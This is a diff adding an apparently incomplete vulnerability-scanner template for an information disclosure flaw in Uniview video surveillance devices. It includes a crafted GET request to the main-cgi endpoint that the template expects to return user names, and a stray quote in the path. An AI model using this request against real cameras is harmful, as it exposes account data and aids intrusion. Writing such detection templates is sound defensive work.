@@ -1,0 +1,17 @@
+id:
+
+info:
+  name: 宇视科技视频监控 main-cgi 文件信息泄露漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /cgi-bin/main-cgi?json={"cmd":255,"szUserName":"","u32UserLoginHandle":-1}"
+response1:
+  headers:
+  body: UserName
+  code:
+requests2:
+response2:
